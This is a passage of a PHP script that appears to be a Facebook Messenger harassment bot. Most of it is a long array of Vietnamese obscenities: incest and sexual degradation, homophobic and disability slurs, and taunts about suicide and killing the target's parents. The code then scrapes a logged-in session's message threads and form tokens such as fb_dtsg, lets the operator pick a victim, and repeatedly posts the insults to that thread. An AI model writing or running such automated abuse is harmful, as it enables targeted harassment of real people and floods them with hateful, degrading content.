𝒏𝒈𝒖 𝒕𝒉𝒊̀ 𝒔𝒐̂́𝒏𝒈 đ𝒄 𝒄𝒐𝒏 𝒄𝒂̣̆𝒄 𝒈𝒊̀ 𝒌𝒉𝒊 𝒕𝒉𝒂̆̉𝒏𝒈 𝒄𝒉𝒂 𝒎𝒂̀𝒚 𝒔𝒖𝒐̂́𝒕 𝒏𝒈𝒂̀𝒚 đ𝒊 đ𝒖̣ đ𝒊̉ 𝒉𝒂̉ 𝒄𝒐𝒏 𝒄𝒉𝒐́ 𝒏𝒈𝒖 𝒍𝒐̂̀𝒏 đ𝒊̣𝒕 𝒄𝒐𝒏 𝒎𝒆̣ 𝒎𝒂̀𝒚 𝒔𝒖̉𝒂 𝒅𝒐̛ 𝒕𝒉𝒊̀ đ𝒖̛̀𝒏𝒈 𝒄𝒐́ 𝒔𝒖̉𝒂 𝒏𝒉𝒂 𝒄𝒐𝒏 𝒄𝒉𝒐́ 𝒏𝒈𝒖 𝒄𝒖̉𝒂 𝒄𝒉𝒂 𝒏𝒐́𝒊 𝒓𝒐̂̀𝒊 đ𝒐́ 𝒄𝒐𝒏 𝒏𝒈𝒐𝒂𝒏 𝒄𝒉𝒂 𝒄𝒉𝒐 𝒃𝒖́ 𝒕𝒊𝒏𝒉 𝒕𝒓𝒖̀𝒏𝒈 đ𝒆̂̉ 𝒔𝒐̂́𝒏𝒈 𝒏𝒉𝒂̆́𝒄 𝒍𝒂̣𝒊 𝒄𝒐𝒏 đ𝒆́𝒐 đ𝒖̉ 𝒕𝒓𝒊̀𝒏𝒉 𝒗𝒐̛́𝒊 𝒄𝒉𝒂 𝒄𝒉𝒂 𝒍𝒂̀ 𝑩𝒐𝒂𝒛 𝑫𝒛 𝒏𝒉𝒂̂́𝒕 𝒄𝒂́𝒊 𝒗𝒊𝒆̣̂𝒕 𝒏𝒂𝒎 𝒏𝒂̀𝒚 𝒏𝒆̂𝒏 𝒄𝒉𝒂 𝒄𝒐́ 𝒕𝒉𝒆̂̉ 𝒅𝒖̣ 𝒄𝒐𝒏 𝒈𝒂́𝒊 𝒎𝒆̣ 𝒏𝒈𝒖 𝒄𝒖̉𝒂 𝒄𝒐𝒏 𝒍𝒆̂𝒏 𝒈𝒊𝒖̛𝒐̛̀𝒏𝒈 𝒏𝒉𝒂́ 𝒄𝒐𝒏 𝒏𝒈𝒖😁",
  "Đ𝒊̣𝒕 𝒄𝒐𝒏 𝒎𝒆̣ 𝒎𝒂̀𝒚 𝒕𝒉𝒖̛́ 𝒏𝒈𝒖 𝒍𝒐̂̀𝒏 𝒗𝒂̀ 𝒄𝒂̉ 𝒄𝒐𝒏 𝒎𝒆̣ 𝒎 𝒏𝒖̛̃𝒂 𝒏𝒉𝒐̛́ 𝒍𝒖́𝒄 𝒕𝒓𝒖̛𝒐̛́𝒄 𝒕 đ𝒊̣𝒕 𝒄𝒐𝒏 𝒎𝒆̣ 𝒎𝒂̀𝒚 𝒍𝒖́𝒄 đ𝒐́ 𝒏𝒐́ đ𝒂𝒏𝒈 𝒎𝒂𝒏𝒈 𝒃𝒂̂̀𝒖 𝒎 đ𝒂̂́𝒚 𝒄𝒐𝒏 𝒄𝒉𝒐́,𝒕 𝒍𝒐̛̃ 𝒙𝒖𝒂̂́𝒕 𝒕𝒊𝒏𝒉 𝒗𝒐̂ 𝒎𝒂̀ đ𝒆́𝒐 𝒗𝒂̀𝒐 𝒕𝒓𝒖̛́𝒏𝒈 𝒗𝒂̀𝒐 𝒉𝒐̣𝒏𝒈 𝒄𝒂̣̆𝒄 𝒎 𝒗𝒂̀ 𝒂̉𝒏𝒉 𝒉𝒖̛𝒐̛̉𝒏𝒈 đ𝒆̂́𝒏 𝒕𝒓𝒊́ 𝒏𝒂̃𝒐 𝒗𝒂̀ 𝒏𝒉𝒂̣̂𝒏 𝒕𝒉𝒖̛́𝒄 𝒄𝒖̉𝒂 𝒎
𝒄𝒐𝒏 𝒎𝒆̣ 𝒎 𝒓𝒂̂́𝒕 𝒌𝒉𝒐̂𝒏 𝒄𝒐̀𝒏 đ𝒆̉ 𝒓𝒂 𝒎 𝒓𝒂̂́𝒕 𝒏𝒈𝒖 𝒗𝒊̀ 𝒕𝒉𝒂̆̀𝒏𝒈 𝒄𝒉𝒂 𝒎 𝒄𝒉𝒖̛́𝒂 1 𝒔𝒐̂́ 𝒍𝒖̛𝒐̛̣𝒏𝒈 𝒕𝒊𝒏𝒉 𝒕𝒓𝒖̀𝒏𝒈 𝒏𝒉𝒖̛ 𝒄𝒐𝒏 𝒄𝒂̣̆𝒄 𝒄𝒉𝒂 𝒎 𝒏𝒈𝒖 𝒄𝒙 𝒌𝒉𝒐̂𝒏𝒈 𝒌𝒆́𝒎 𝒏𝒆̂𝒏 đ𝒆̉ 𝒎 𝒓𝒂 𝒎 𝒏𝒈𝒖 𝒗𝒂̀ 𝒕𝒂̣̂𝒕 𝒏𝒈𝒖𝒚𝒆̂̀𝒏 𝒏𝒉𝒖̛ 𝒕𝒉𝒂̆̀𝒏𝒈 𝒄𝒉𝒂 𝒎 🤮 🤮𝑪𝒉𝒂 𝒎𝒂̀𝒚 𝒃𝒊̣ 𝒎𝒂̂́𝒕 𝒕𝒖̛́ 𝒄𝒉𝒊 𝒗𝒊̀ 𝒃𝒂 𝒄𝒖̉𝒂 𝒕𝒉𝒂̆̀𝒏𝒈 𝒄𝒉𝒂 𝒎 đ𝒆́𝒐 𝒄𝒐́ 𝒕𝒂𝒚 𝒄𝒉𝒂̂𝒏 𝒔𝒊𝒏𝒉 𝒓𝒂 𝒃𝒂 𝒄𝒖̉𝒂 𝒃𝒂 𝒄𝒖̉𝒂 𝒄𝒉𝒂 𝒎 𝒍𝒂̀ 1 𝒍𝒖̃ 𝒕𝒂̣̂𝒕 𝒏𝒈𝒖𝒚𝒆̂̀𝒏 𝒂̆𝒏 𝒄𝒂̣̆𝒄 đ𝒆̂̉ 𝒔𝒐̂́𝒏𝒈 𝒏𝒖𝒐̂́𝒕 𝒕𝒊𝒏𝒉 𝒕𝒓𝒖̀𝒏𝒈 đ𝒆̂̉ 𝒏𝒐,𝒏𝒈𝒖 𝒕𝒐̛́𝒊 𝒏𝒐̂̃𝒊 𝒎𝒂̀ 𝒃𝒖́ 𝒄𝒂̣̆𝒄 𝒏𝒉𝒂𝒖 𝒔𝒐̂́𝒏𝒈 𝒄𝒉𝒂 𝒎 đ𝒆́𝒐 𝒄𝒐́ 𝒕𝒖̛́ 𝒄𝒉𝒊 𝒎𝒂̀ 𝒉𝒂𝒚 𝒕𝒉𝒊́𝒄𝒉 𝒍𝒂̂́𝒚 𝒕𝒊𝒆̂̀𝒏 đ𝒊 đ𝒖̣ đ𝒊̉ 𝒉𝒆̂́𝒕 𝒕𝒊𝒆̂̀𝒏 𝒕𝒉𝒊̀ 𝒄𝒐𝒏 𝒎𝒆̣ 𝒎 𝒃𝒂𝒏𝒉 𝒍𝒐̂̀𝒏 𝒄𝒉𝒐 𝒕 đ𝒊̣𝒕 𝒕𝒓𝒐𝒏𝒈 𝒌𝒉𝒊 𝒄𝒐̀𝒏 2 𝒏𝒈𝒂̀𝒚 𝒏𝒖̛̃𝒂 𝒎 𝒔𝒊𝒏𝒉 𝒓𝒂 𝒗𝒂̀ 𝒕𝒊𝒏𝒉 𝒕𝒓𝒖̀𝒏𝒈 𝒕 𝒃𝒂̆́𝒏 𝒕𝒉𝒂̆̉𝒏𝒈 𝒗𝒂̀𝒐 𝒉𝒐̣𝒏𝒈 𝒎 𝒕 𝒄𝒐́ 𝒕𝒉𝒆̂̉ 𝒄𝒂̉𝒎 𝒏𝒉𝒂̣̂𝒏 𝒎 𝒃𝒕 𝒃𝒖́ 𝒄𝒂̣̆𝒄 𝒌𝒉𝒊 𝒕𝒖̛̀ 𝒍𝒂̀ 1 𝒕𝒉𝒂𝒊 𝒏𝒉𝒊 🤮 🤮🤮 𝑸𝒖𝒂́ 𝒍𝒂̀ 𝒌𝒊𝒏𝒉 𝒕𝒐̛̉𝒎,𝒔𝒂𝒖 𝒌𝒉𝒊 𝒏𝒉𝒖̛̃𝒏𝒈 đ𝒊𝒆̂̀𝒖 𝒌𝒊𝒏𝒉 𝒕𝒐̛̉𝒎 đ𝒐́ 𝒙𝒂̉𝒚 𝒓𝒂 𝒕𝒉𝒊̀ 𝒎 𝒄𝒙 𝒏𝒉𝒖̛ 𝒕𝒉𝒂̆̀𝒏𝒈 𝒄𝒐̂́ 𝒎 𝒍𝒂̀ 𝒃𝒖́ 𝒄𝒂̣̆𝒄 đ𝒆̂̉ 𝒔𝒐̂́𝒏𝒈 𝒒𝒖𝒂 𝒏𝒈𝒂̀𝒚 𝒏𝒆̂𝒏 𝒄𝒂́𝒊 𝒏𝒂̃𝒐 𝒄𝒉𝒐́ 𝒎 đ𝒆́𝒐 𝒃𝒂𝒐 𝒈𝒊𝒐̛̀ 𝒑𝒉𝒂́𝒕 𝒕𝒓𝒊𝒆̂̉𝒏 đ𝒖̛𝒐̛̣𝒄 𝒗𝒂̀ 𝒎𝒂̀𝒚 𝒃𝒊̣ 𝒏𝒉𝒖̛ 𝒗 𝒅𝒐 𝒄𝒐𝒏 𝒄𝒉𝒐́ 𝒄𝒐̂́ 𝒎 𝒂̆𝒏 𝒄𝒂̣̆𝒄 𝒏𝒆̂𝒏 𝒅𝒊 𝒄𝒉𝒖𝒚𝒆̂̉𝒏 𝒕𝒖̛̀ 𝒃𝒂 𝒄𝒖̉𝒂 𝒃𝒂 𝒎𝒂̀𝒚 𝒗𝒂̀ 𝒕𝒉𝒂̆̀𝒏𝒈 𝒄𝒂̣̆𝒄 𝒄𝒉𝒂 𝒎 𝒃𝒖́ 𝒄𝒖 𝒏𝒉𝒂𝒖 𝒔𝒐̂́𝒏𝒈 𝒒𝒖𝒂 𝒏𝒈𝒂̀𝒚, 𝒕𝒂𝒐 𝒄𝒐̀𝒏 𝒏𝒉𝒐̛́ 𝒍𝒖́𝒄 𝒕𝒓𝒖̛𝒐̛́𝒄 𝒕𝒉𝒂̆̀𝒏𝒈 𝒄𝒉𝒂 𝒎 𝒙𝒊𝒏 𝒃𝒖́ 𝒄𝒂̣̆𝒄 𝒕 𝒗𝒊̀ đ𝒆́𝒐 𝒄𝒐́ 𝒕𝒊𝒆̂̀𝒏 đ𝒊 𝒄𝒉𝒐̛𝒊 đ𝒊̉ 😂𝒕 𝒄𝒉𝒂̀ 𝒎𝒖𝒐̂́𝒏 đ𝒂̂𝒖 𝒏𝒆̂𝒏 𝒕 𝒌𝒆̂𝒖 𝒄𝒉𝒂 𝒎 𝒗𝒂̀ 𝒕𝒌 𝒄𝒉𝒂 𝒄𝒖̉𝒂 𝒄𝒉𝒂 𝒎 đ𝒊̣𝒕 𝒏𝒉𝒂𝒖 𝒕𝒓𝒄 𝒎𝒂̣̆𝒕 𝒕 𝒕 𝒄𝒉𝒐 𝒕𝒊𝒆̂̀𝒏 𝒍𝒖́𝒄 đ𝒐́ 𝒎𝒖̛̀𝒏𝒈 𝒏𝒉𝒖̛ 𝒄𝒐𝒏 𝒄𝒉𝒐́ 𝒂̆𝒏 đ𝒖̛𝒐̛̣𝒄 𝒄𝒖̣𝒄 𝒄𝒖̛́𝒄 𝒕𝒉𝒐̛𝒎🤣🤣🤣🤣𝑵𝒆̂𝒏 𝒍𝒂̀ 𝒕 𝒕𝒉𝒂̂́𝒚 𝒗𝒂̣̂𝒚 𝒕 đ𝒊̣𝒕 𝒄𝒂̉ 𝒉𝒐̣ 𝒉𝒂̀𝒏𝒈 𝒏𝒉𝒂̀ 𝒎 𝒕𝒓𝒄 𝒎𝒂̣̆𝒕 𝒄𝒐𝒏 𝒎𝒆̣ 𝒎𝒂̀𝒚 𝒍𝒖́𝒄 đ𝒐́ 𝒏𝒉𝒊̀𝒏 𝒎𝒂̣̆𝒕 𝒏𝒐́ 𝒕𝒉𝒆̀𝒎 𝒄𝒖 𝒍𝒂̆́𝒎 𝒕𝒉𝒆̂́ 𝒏𝒆̂𝒏 𝒕 𝒃𝒕 𝒈𝒆𝒏 𝒅𝒊 𝒄𝒉𝒖𝒚𝒆̂̉𝒏 𝒎𝒆̂ 𝒄𝒖 𝒕𝒖̛̀ 𝒐̂𝒏𝒈 𝒄𝒐̂́ 𝒎 𝒕𝒐̛́𝒊 𝒐̂𝒏𝒈 𝒏𝒐̣̂𝒊 𝒎 𝒓 𝒄𝒐𝒏 𝒎𝒆̣ 𝒎𝒂̀𝒚 𝒓 𝒎𝒂̀𝒚 𝒏𝒆̂𝒏 𝒃𝒂̂𝒚 𝒈 𝒎 𝒑𝒉𝒂̉𝒊 đ𝒊 𝒃𝒖́ 𝒄𝒂̣̆𝒄 𝒅𝒂̣𝒐 đ𝒆̂̉ 𝒌𝒊𝒆̂𝒎 𝒕𝒊𝒆̂̀𝒏 𝒔𝒐̂́𝒏𝒈 𝒒𝒖𝒂 𝒏𝒈𝒂̀𝒚 𝒗𝒂̀ 𝒎 đ𝒆́𝒐 𝒌𝒉𝒂́𝒄 𝒈𝒊̀ 𝒎𝒐̣̂𝒕 𝒄𝒐𝒏 𝒔𝒖́𝒄 𝒗𝒂̣̂𝒕 𝒓𝒂́𝒄 𝒄𝒖̉𝒂 𝒙𝒂̃ 𝒉𝒐̣̂𝒊 𝒏𝒆̂𝒏 𝒍𝒂̀ đ𝒖̛̀𝒏𝒈 𝒔𝒖̉𝒂 𝒏𝒉𝒖̛̃𝒏𝒈 ",
  "Địt con mẹ mày thứ ngu lồn và cả con mẹ m nữa nhớ lúc trước t địt con mẹ mày lúc đó nó đang mang bầu m đấy con chó,t lỡ xuất tinh vô mà đéo vào trứng vào họng cặc m và ảnh hưởng đến trí não và nhận thức của m
con mẹ m rất khôn còn đẻ ra m rất ngu vì thằng cha m chứa 1 số lượng tinh trùng như con cặc cha m ngu cx không kém nên đẻ m ra m ngu và tật nguyền như thằng cha m 🤮 🤮Cha mày bị mất tứ chi vì ba của thằng cha m đéo có tay chân sinh ra ba của ba của cha m là 1 lũ tật nguyền ăn cặc để sống nuốt tinh trùng để no,ngu tới nỗi mà bú cặc nhau sống cha m đéo có tứ chi mà hay thích lấy tiền đi đụ đỉ hết tiền thì con mẹ m banh lồn cho t địt trong khi còn 2 ngày nữa m sinh ra và tinh trùng t bắn thẳng vào họng m t có thể cảm nhận m bt bú cặc khi từ là 1 thai nhi 🤮 🤮🤮 Quá là kinh tởm,sau khi những điều kinh tởm đó xảy ra thì m cx như thằng cố m là bú cặc để sống qua ngày nên cái não chó m đéo bao giờ phát triển được và mày bị như v do con chó cố m ăn cặc nên di chuyển từ ba của ba mày và thằng cặc cha m bú cu nhau sống qua ngày, tao còn nhớ lúc trước thằng cha m xin bú cặc t vì đéo có tiền đi chơi đỉ 😂t chà muốn đâu nên t kêu cha m và tk cha của cha m địt nhau trc mặt t t cho tiền lúc đó mừng như con chó ăn được cục cức thơm🤣🤣🤣🤣Nên là t thấy vậy t địt cả họ hàng nhà m trc mặt con mẹ mày lúc đó nhìn mặt nó thèm cu lắm thế nên t bt gen di chuyển mê cu từ ông cố m tới ông nội m r con mẹ mày r mày nên bây g m phải đi bú cặc dạo để kiêm tiền sống qua ngày và m đéo khác gì một con súc vật rác của xã hội nên là đừng sủa những câu nghĩ mình hơn người khác nha con chó ngu ơii😂😂",
  "Tuổi Lồn Đọ Với Cha Á ?",
  "lần sau gặp cha TĐạt 🐲 thì xin tha đi🤣",
  "lên chửi nhau với cha phát:))?🤣",
  "cha lên giết cha mẹ m nè con🤣",
  "mày sợ à con 🐕",
  "thg bất hiếu ám sát cha mẹ",
  "mày bại t rõ mà",
  "còn cố gì nx tr🤣🙃",
  "thg ngu loạn luân với mẹ mà còn chối🤤🤣",
  "t cân cả dòng họ m mà:))",
  "Mày đang mếu vì bị cha chửi đúng ko🤣",
  "bú cứt cha đi cha tha cho m nè con🤣",
  "thg bê đê bị cha chửi cay phải tự tử",
  "bớt sủa dơ đi nha e eiii",
  "tao đã cho m câm chưa hả",
  "thg ngu đòi bem cha và cái kết...🤣",
  "mày cảm thấy bất lực khi bị t bem đúng k",
  "thg ngu đú war kiểu🤣",
  "mới có xíu m đã bại t mẹ r",
  "yếu rồi còn sĩ",
  "m còn gì khác để làm tao cay không",
  "hay là chỉ biết ăn hôi🤣",
  "đúng là thg tật mồ côi🤣",
  "Mù ngôn ngữ",
  "sài adr 2m đòi khè ai v tr",
  "thg tật bẩm sinh🤣",
  "đáy của xã hội",
  "bốc cứt ăn qua ngày🤣",
  "tưởng mình hay",
  "mà trong khi mình ngu hơn 1 con dog",
  "mày bại tao all sàn mxh với real mà",
  "còn cãi đc k🤣",
  "cãi to lên🤣🤤",
  "xem m trụ đc bao lâu:))",
  "thg ngu ko có não phải gắn não bò thay thế🤣🤣",
  "cạn bã của XH mà tưởng mình hay🤣💨",
  "đúng dân va 2023 có khác",
  "sủa câu nào làm t cười tới đó",
  "con thí nhai đi nhai lại ngôn v🤣",
  "m có trình k v thg bẻm?",
  "thg đú lgbt ớt cmnr🤣",
  "cầu cứu ae mày đi",
  "hay là phế quá nên bị ae m ruồng bỏ🤣",
  "đúng thg bẻm ngu còn ảo🤣",
  "cạn ngôn ngữ r à?😃",
  "mới gõ có tí đã mệt r à",
  "cố đi con chó thất học🥲",
  "cầu cứu lẹ ei",
  "ai cứu đc m à :))",
  "tao bá mà",
  "sao m gà thế",
  "hăng lẹ cho tao",
  "con chó eiii🤣",
  "ổn k em",
  "kh ổn r à",
  "mày óc à con chó bẻm=))",
  "mẹ mày ngu à",
  "bú cặc cha m k em",
  "thg giả gái :))",
  "coi nó ngu kìa ae",
  "con chó này giả ngu à",
  "m ổn k",
  "mồ côi kìa",
  "sao v sợ r à",
  "cố gắng tí em",
  "cay cú lắm r",
  "đấy đấy bắt đầu",
  "chảy nước đái bò r à em",
  "sao kìa đừng run",
  "mày run à:))",
  "thg dái lở",
  "cay mẹ m lắm",
  "lgbt xuất trận à con đĩ",
  "thg cặc giết cha mắng mẹ",
  "sủa mạnh eii",
  "Lũ đú ấm ức cha mày rõ mà😗❗",
  "Sao rồi ổn lòi lìa hả 🤔",
  "Cha mày đấng mxh mà lũ ngu🤣",
  "Cay cha mày lắm r phải kh",
  "Đái ra máu r kìa cn ngu ơi🤣",
  "Cưng xạo lồn bịa chuyện là hay😗",
  "Chứ trình mày làm gì có tuổi ăn anh🤣",
  "Cưng hăng hái 1 cách bất thường à🤣",
  "Cay cú anh trong lòng mà không làm đc gì🤔🌶",
  "Cay đỏ bướm rồi à cn ngu🌶❗",
  "Thk cặc cay anh đỏ dái mẹ r🌶❗🤪",
  "Khi nào cs trình v cn ôn thú",
  "Mặt mày như cn quái thai từ trong bào thai v🤪",
  "Ê con suy tàn đạo đức🤪",
  "Nhân cách thối nát đáy của tạp chủng 🤣",
  "Cái con không có địa vị bằng 1 cn súc vật nữa🤪🤣",
  "Cha mày gõ cho mày nguyên 1 tràn lan đại hải🤣",
  "Gõ cho mày tá hỏa tâm tinh🤪",
  "Gõ cho mày siêu thoát quá thế giới bên kia🤣",
  "Con đỉ bị cha hành hạ🤪",
  "Cn tinh tinh mặt cặc❗",
  "Cn thú mặt người",
  "Cn khỉ mặt nhân loại🐵❗",
  "Cn tạp nham cay anh🌶❗",
  "Khóc r à em🤣❗",
  "Bất ổn r à🤣",
  "Mếu máo mẹ mày r🤣",
  "Sao rồi em gái🤣",
  "Mày bị cha cho cay cú mà🌶🤣",
  "Về méc mẹ rồi à🤣",
  "Sao không hăng nx đi🤣",
  "Gõ yếu vậy à🤣",
  "Gõ sồn máu lồn mày lên",
  "Hăng hái lên cha xem🤣",
  "Cay cú nên hóa rồ rồi à🤣",
  "Mới gõ tí đã đuối rồi🤣",
  "Bị anh cho ngậm đống hành trong mõm r🤣🤣",
  "Gõ sồn sồn lên xôm lên xem nào🤣",
  "Bất ổn cmnr🤣",
  "Não bị cha mày cho tàn phế r à🤣",
  "Ê sao cn thú nhai ngôn r🤣",
  "Sức cùng lực kiệt r à🤣",
  "Ê cay đái kh còn giọt máu r à🤣",
  "Cha mày chuyên trị lũ đú mà🤣",
  "Cưng sao v hả🤣",
  "Không hăng như lúc đầu nữa hả🤣",
  "Eo ôi:>🤪",
  "Còn sống kh v😗",
  "Mày bị cha hành mà:3",
  "Cha cấm mày bịa chuyện nha🤔",
  "Cha quin mà cn thú êy🤪",
  "Hóng quin đc cha lắm hỏ🤪",
  "Ê cn quái thú🤪",
  "Mày là cn quái thú giữa rừng xanh mà🤪",
  "Mày tưởng mày đang đóng vai ng đẹp và quái vật hả🤪",
  "Mày tưởng mày đang đóng vai ng đẹp và quái vật hả🤪",
  "Thoát ra khỏi cái mộng tưởng đó đi nhóc🤪",
  "Sao bị cha chửi mà tha hóa lun r🤪",
  "Sống phèn quá v cn thú đú êy😳",
  "Mếu cha mẹ r🤪",
  "Cay cú mẹ r🌶❗",
  "Lgbt bày binh bố trận dồn cha hả🤪❗",
  "Dồn ngu mà cũng đòi dồn❗🦋",
  "Nhìn lũ tật cầm cái phím tắt hăng ghê🤣",
  "Cha mày chúa tể trị lũ đú🤪",
  "Cha mày bón cứt dô mõm m nè😏",
  "Ê đỉ ngu🤣",
  "Sao rồi ổn kh",
  "Hay ổn lòi lìa😴😳",
  "Nhìn mặt m là bt không ổn r😳",
  "Cn tinh tinh bị cha đọa đày😁",
  "Bị cha mày đọa đày xuống diêm la địa phủ😗",
  "Để đầu thai chuyển kiếp thành súc vật🤣",
  "Đừng cay cha mà làm liều❗❗",
  "Nhìn bản mặt mày là đủ hiểu cay cỡ nào🌶",
  "Mày đái ra máu r kìa🌶🤣",
  "Nhanh tay lên nào🤣",
  "Nhanh tay múc nc máu lồn cho tk cha mày uống lẹ🤣",
  "Rồi lun cn ôn thú bị anh sỉ nhục mẹ r🤣",
  "Sỉ nhục như cn động vật bậc thấp🤣",
  " ngu si 4 chi phát triển🤪",
  "Tự nhiên cái hăng ngang dị🤣",
  "Hăng ngang làm anh sợ ghê 😱",
  "Hăng lên đc tí r ngủm r à🤪",
  "Đái ra máu xè xè r🤣❗",
  "Ăn năn xám hối r à ❗🤣",
  "Cay quá nên uống nc đái chó cho đỡ cay đi em🤣",
  "Mếu chết đỉ mẹ mày đi",
  "Đầu thai mẹ mày đi cn tạp chủng🤣",
  "Cn ngu xi đần độn dốt nát🤣",
  "Bị cha cho tha hóa thành cchó ngu dốt🤣",
  "Sao mày ngu như 🐮 v",
  "Cay cay cay cha rồi🤣",
  "Ai cho mày cay cha hả🤣",
  "Cay chừa phần người ta với🤣",
  "Cay ht phần thiên hạ là sao dị 🤨",
  "Ê cn thú hoang dã🤣",
  "Cn dị tật bẩm sinh liệt não",
  "Hấp hối mẹ mày rồi à🤨",
  "Cha mày trùm đấng mxh ai làm lại anh đâu😁",
  "Mày khóc rồi à🤣",
  "Con bào thai trong ống nghiệm cũng bt mếu à🤣",
  "Mày sủa như cách cn chó nhà mày sủa đê🤣",
  "Ê sao cay cú cha mày rồi😳",
  "Ai cho mày cay cha hả😗",
  "Cn tinh tinh đội lót nhân dân hại dân lành🤣",
  "Cạn ngôn r hả cn thú ngu êy",
  "Sao lặp ngôn liên tục v🤣",
  "Gõ dài dòng kh dame thì gõ làm gì🤣",
  "Mày là cn phò trường chinh mà🤣",
  "Cn thú mại dâm bán dâm mà như bán trinh hoa hậu v🤣",
  "Ê cn đỉ phát ngôn xàm bậy🤣",
  "Mày đừng tự vả dô mặt m nữa🤣",
  "Nhìn mày là bt kh ổn r!",
  "Mày bt anh là chuyên trừng trị những thể loại như m kh",
  "Sao mày đú quá v🤣",
  "Khi nào ht đú hả cn thú ngu",
  "Chắc xog quả này chắc ht đú ha",
  "Ê cn thú ngu ngục bẩm sinh",
  "Mày là cn thú ms đẻ ra đã ngu sẵn r🤣",
  "Ê cn âm binh đầu đường xó chợ🤪",
  "Mày hăng mạnh mẽ lên đê🤪",
  "Sao tự nhiên yếu xìu như xìu cặc v🤣",
  "Mẹ mày bị mày loạn luân đụ rung lồn mà🤣",
  "Cặc chưa mọc lông mà đòi đụ này đụ kia🤣",
  "con chó ngu ngục lên thể hiện trình bị anh sút🤣",
  "thằng ngu đang cố tỏ ra mình ổn à",
  "ơ ơ ơ sao em lại hăng ",
  "dân war 2024 hăng ròi kìa ae",
  "bị anh chọc cho tê cu à ",
  "nhìn tk óc dái đú đang đú bot nhìn ngu vậy 🤣",
  "ơ tk ngu ai treo vậy em ",
  "tự nhiên treo vậy tk gà bí ngôn",
  "ai giả bộ sợ cho em nó đỡ quê đê😝",
  "tk ngu ăn cứt tao mà ra oai à",
  "sao em đú dữ vậy tỉnh lên đê",
  "mày chết r à:))",
  "sao chết kìa",
  "bị t hành nên muốn chết à",
  "con lồn ngu=))",
  "sao kìa",
  "mạnh lên kìa",
  "yếu sinh lý à",
  "sủa đê",
  "cay à",
  "hăng đê",
  "gà kìa ae",
  "akakaa",
  "óc chó kìa",
  "🤣🤣🤣",
  "ổn không🤣🤣",
];
    $emojis = ['🐲','🐯','🌸','🌹','🐶'];
    $icontay = ['🚫','☠️','🫶','🤙','🤞','👊'];
if (!isset($_SESSION['current_index'])) {
    $_SESSION['current_index'] = 0;
} else {
    $_SESSION['current_index'] = ($_SESSION['current_index'] + 1) % count($vanh['dz']);
}
    $nhayy = $vanh['dz'][$_SESSION['current_index']];
    $icon = $emojis[array_rand($emojis)];
    $iconhai = $dem%count($icontay);
    $iconba = $icontay[$iconhai]; 
    $_SESSION['ND_SPAM_MESS'] = $nhayy . ' ' . $icon . ' ' . $iconba;    
    $data_1 = $_SESSION['DATA_SPAM_MESS'];
    $data_1 = str_replace("<NDSEND>", $_SESSION['ND_SPAM_MESS'], $data_1);
    $data_1 = str_replace("<DEM>", $dem_stt_messs,$data_1);
    $nd_messs = str_replace("<DEM>", $dem_stt_messs,$_SESSION['ND_SPAM_MESS']);
    $_SESSION['ND_SPAM_MESS1'] = $nd_messs;
    $curl = curl_init();
    curl_setopt_array($curl, array(
    CURLOPT_PORT => "443",
    CURLOPT_URL => "https://mbasic.facebook.com/messages/send/?icm=1&refid=12",
    CURLOPT_ENCODING => "",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CUSTOMREQUEST => "POST",
    CURLOPT_POSTFIELDS => $data_1,
    CURLOPT_HTTPHEADER => $_SESSION['HD_SPAM_MESS']));
    $x = curl_exec($curl); curl_close($curl);
        $dem++;
echo "\033[1;36m⌠\e[1;34mBây giờ là \e[1;37m".date("H:i:s")."\e[1;36m⌡\e[1;33tĐạt \e[1;36mNhây \e[1;34m".$dem." \e[1;36mLần!\n\033[1;".rand(31,37)."m"."𝐀𝐝𝐦𝐢𝐧 𝐒𝐮𝐩𝐩𝐨𝐫𝐭: 𝓣𝓲ế𝓷 Đạ𝓽\n";
$sl++;
		if ($sl < $dungtool){
	delay($delay);
		} else {
                echo "\n".$thanh_dep."\033[1;36mSpam Xong Rồi Thằng Đầu Buồi                                                  \r\n";
			die();
		}
    }
function getallspam($thanh,$thanh_dep, $xnhac, $trang, $luc, $vinh){
    $curl = curl_init();
    curl_setopt_array($curl, array(
    CURLOPT_PORT => "443",
    CURLOPT_URL => "https://mbasic.facebook.com/messages/?ref_component=mbasic_home_header&ref_page=MMessagingThreadlistController&refid=11",
    CURLOPT_ENCODING => "",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CUSTOMREQUEST => "GET",
    CURLOPT_HTTPHEADER => $_SESSION['HD_SPAM_MESS']));
    $x = curl_exec($curl); curl_close($curl);
    if(strpos($x, "/messages/read/?")){
    for($i=1;$i<50;$i++){
    $getinfo = explode("<img",explode('/messages/read/?',$x)[$i])[0]; 
    if($getinfo ==! ""){
    $getname = explode("<",explode(">",$getinfo)[1])[0];
    echo $thanh.$do."[".$trang.$i.$do."]"."\033[1;".rand(31,37)."m ".$getname."\n";
    $getidlink = explode("#fua",$getinfo)[0];
    $aslink = "/messages/read/?".$getidlink;
    $k = fopen("idlink.txt","a");
    fwrite($k, $aslink."\n");
    fclose($k);
    }else{break;}
    }
    }else{echo "Lỗi Acc Rồi ⚠";exit;}
    while(true){
    	echo $vinh;
    echo $thanh_dep.$xnhac."Chọn Thk Ngu Để Nhây: $vang";
    $acc = trim(fgets(STDIN));
    if(is_numeric($acc)){
    $line = file("idlink.txt", FILE_IGNORE_NEW_LINES);
    $acc--;
    global $asslink;
    global $csid;
    $asslink = $line[$acc];
    break;}else{echo "Nhập Số 😤"."\n";}
    } 	
    $curl = curl_init();
    curl_setopt_array($curl, array(
    CURLOPT_PORT => "443",
    CURLOPT_URL => "https://mbasic.facebook.com".$asslink,
    CURLOPT_ENCODING => "",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CUSTOMREQUEST => "GET",
    CURLOPT_HTTPHEADER => $_SESSION['HD_SPAM_MESS']));
    $x = curl_exec($curl); curl_close($curl);
    for($t=1;$t<20;$t++){
    $d1 = explode(">",explode('<input type="hidden"',$x)[$t])[0];
    $getd = explode('"',explode('value="',$d1)[1])[0];
    if(strpos($d1, "fb_dtsg")){$fb_dtsg=$getd;}
    if(strpos($d1, "jazoest")){$jazoest=$getd;}
    if(strpos($d1, "tids")){$tids=$getd;}
    if(strpos($d1, "wwwupp")){$wwwupp=$getd;}
    if(strpos($d1, "ids")){$ids=$getd;}
    if(strpos($d1, "cver")){$cver=$getd;}
    if(strpos($d1, "csid")){$csid=$getd;break;}
    }
    $data = "fb_dtsg=".$fb_dtsg."&jazoest=".$jazoest."&body=‎‎<NDSEND>&send=Gửi&tids=".$tids."&wwwupp=".$wwwupp."&ids[".$ids."]=".$ids."&referrer=&ctype=&cver=".$cver."&csid=".$csid;
    return $data;
}
function delay ($delay){
